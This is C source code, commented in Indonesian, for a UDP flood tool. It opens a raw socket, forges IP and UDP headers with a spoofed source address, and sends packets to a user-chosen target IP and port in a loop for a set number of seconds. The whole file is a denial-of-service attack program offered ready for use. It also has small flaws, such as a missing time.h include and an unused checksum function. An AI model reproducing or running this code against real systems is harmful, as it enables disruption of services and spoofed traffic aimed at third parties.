#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#define PCKT_LEN 8192

// Struktur untuk membuat header IP
struct ipheader {
    unsigned char      iph_ihl:4, // Header length
                       iph_ver:4; // Version
    unsigned char      iph_tos;   // Type of service
    unsigned short int iph_len;   // Total length
    unsigned short int iph_ident; // Identification
    unsigned short int iph_flag:3,// Fragmentation flags
                       iph_offset:13; // Flags offset
    unsigned char      iph_ttl;   // Time to live
    unsigned char      iph_protocol; // Protocol
    unsigned short int iph_chksum; // Header checksum
    struct  in_addr    iph_sourceip; // Source IP address
    struct  in_addr    iph_destip;   // Destination IP address
};

// Struktur untuk membuat header UDP
struct udpheader {
    unsigned short int udph_srcport; // Source port
    unsigned short int udph_destport; // Destination port
    unsigned short int udph_len; // Length of UDP packet
    unsigned short int udph_chksum; // UDP checksum (optional)
};

// Fungsi untuk menghitung checksum
unsigned short checksum(void *b, int len) {    
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <target IP> <port> <time>\n", argv[0]);
        return -1;
    }

    // Ambil argument dari command line
    char *target_ip_str = argv[1];
    int target_port = atoi(argv[2]);
    int time_duration = atoi(argv[3]);

    // Buat socket raw
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return -1;
    }

    // Set socket untuk bisa mengirimkan IP header
    int one = 1;
    const int *val = &one;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        return -1;
    }

    // Data untuk mengisi packet
    char packet[PCKT_LEN];

    // Set semua byte di packet ke 0
    memset(packet, 0, PCKT_LEN);

    // Struktur untuk header IP
    struct ipheader *ip = (struct ipheader *) packet;

    // Struktur untuk header UDP
    struct udpheader *udp = (struct udpheader *) (packet + sizeof(struct ipheader));

    // Target IP
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip_str);

    // Fill in the IP Header
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 16;
    ip->iph_len = sizeof(struct ipheader) + sizeof(struct udpheader);
    ip->iph_ident = htons(54321);
    ip->iph_ttl = 64;
    ip->iph_protocol = IPPROTO_UDP;
    ip->iph_sourceip.s_addr = inet_addr("192.168.1.1"); // Source IP (Spoofed IP address)
    ip->iph_destip.s_addr = sin.sin_addr.s_addr;

    // Fill in the UDP Header
    udp->udph_srcport = htons(12345);
    udp->udph_destport = htons(target_port);
    udp->udph_len = htons(sizeof(struct udpheader));
    udp->udph_chksum = 0; // UDP checksum (optional)

    // Informasi target
    printf("Flooding %s:%d for %d seconds\n", target_ip_str, target_port, time_duration);

    // Waktu awal
    time_t start_time = time(NULL);

    // Kirim paket secara berulang selama waktu yang ditentukan
    while (time(NULL) - start_time < time_duration) {
        if (sendto(sockfd, packet, ip->iph_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            perror("Packet send failed");
        }
    }

    close(sockfd);
    return 0;
}
